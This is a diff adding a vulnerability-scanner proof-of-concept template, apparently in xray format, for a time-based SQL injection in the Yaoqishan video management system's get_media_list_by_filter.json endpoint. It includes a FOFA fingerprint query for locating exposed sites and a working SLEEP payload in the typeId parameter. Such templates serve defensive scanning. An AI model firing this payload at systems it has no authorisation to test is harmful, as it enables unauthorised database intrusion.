@@ -1,0 +1,18 @@
+id: poc-yaml-yaoqishan-get-media-list-by-filter-json-sqli
+info:
+  name: 妖气山视频管理系统 get_media_list_by_filter.json SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 妖气山视频管理系统
+  fofa: body="yaoqishan-header"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /api/get_media_list_by_filter.json?typeId=1%27+AND+(SELECT+5396+FROM+(SELECT(SLEEP({{.t1}})))iVgi)+AND+%27wsMJ%27=%27wsMJ
+  expression: status_code == 200 && contains(body,"操作成功") && contains(body,"\"data\":")
+    && contains(content_type,"application/json") && duration > t2 && duration < t3
+transport: http
